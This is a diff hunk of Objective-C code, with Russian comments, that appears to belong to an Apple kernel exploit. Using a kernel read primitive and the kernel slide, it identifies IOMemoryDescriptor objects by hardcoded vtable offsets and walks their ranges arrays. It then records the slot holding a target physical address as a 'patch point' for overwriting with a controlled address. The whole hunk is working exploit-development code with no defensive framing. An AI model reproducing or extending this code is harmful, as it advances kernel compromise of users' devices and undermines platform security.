@@ -6124,8 +6124,39 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (objs[4]) {
                 uint64_t pd = objs[4];
                 uint64_t pvt = kp_untag_ptr(early_kread64(pd));
-                kpNote(r, [NSString stringWithFormat:@"  planeDesc vtable: %#llx (file %#llx) — класс IOMD",
-                          (unsigned long long)pvt, (unsigned long long)(pvt - kslide)]);
+                uint64_t pvtFile = pvt ? pvt - kslide : 0;
+                kpNote(r, [NSString stringWithFormat:@"  planeDesc vtable: %#llx (file %#llx)%@",
+                          (unsigned long long)pvt, (unsigned long long)pvtFile,
+                          pvtFile == 0x7afc5b0 ? @" = IOGeneralMemoryDescriptor" :
+                          pvtFile == 0x7afc0b0 ? @" = IOSubMemoryDescriptor" : @" — класс IOMD"]);
+                // 1.9.158 (раунд 34): IOGMD +0x60=_ranges* ({addr,len} stride 0x10),
+                // +0x68=count; IOSubMD +0x60=_parent → рекурсия в parent. Явный
+                // патч-поинт: [ranges*]==backingPA → пишем ctlPA туда.
+                uint64_t md = pd;
+                for (int lvl = 0; lvl < 2 && nSlots < 8; lvl++) {
+                    uint64_t rP = kp_untag_ptr(early_kread64(md + 0x60));
+                    uint32_t rc32 = (uint32_t)early_kread64(md + 0x68);
+                    if (!kpLooksLikeKernelPointer(rP) || (uint32_t)(rP & 0x3fff) + 0x10 > 0x4000) break;
+                    uint64_t a0 = early_kread64(rP);
+                    uint64_t a1 = early_kread64(rP + 8);
+                    kpNote(r, [NSString stringWithFormat:@"    IOMD lvl%d: md=%#llx [+0x60]=%#llx count=%u [0]=%#018llx [8]=%#018llx",
+                              lvl, (unsigned long long)md, (unsigned long long)rP, rc32,
+                              (unsigned long long)a0, (unsigned long long)a1]);
+                    if (a0 == backingPA) {
+                        kpNote(r, @"    ★ IOMD ranges[0].addr == backingPA — ПАТЧ-ПОИНТ");
+                        BOOL dup = NO;
+                        for (int j = 0; j < nSlots; j++) if (slotVAs[j] == rP) { dup = YES; break; }
+                        if (!dup) {
+                            slotVAs[nSlots] = rP;
+                            origQs[nSlots] = a0;
+                            slotForm[nSlots] = 2;
+                            nSlots++;
+                        }
+                        break;
+                    }
+                    md = rP;   // не совпало: возможно IOSubMD — идём в parent
+                    if (!kpLooksLikeKernelPointer(md)) break;
+                }
                 for (uint32_t o = 0; o + 8 <= 0x200 && nSlots < 8; o += 8) {
                     uint64_t P = kp_untag_ptr(early_kread64(pd + o));
                     if (!kpLooksLikeKernelPointer(P) || (uint32_t)(P & 0x3fff) + 0x10 > 0x4000) continue;
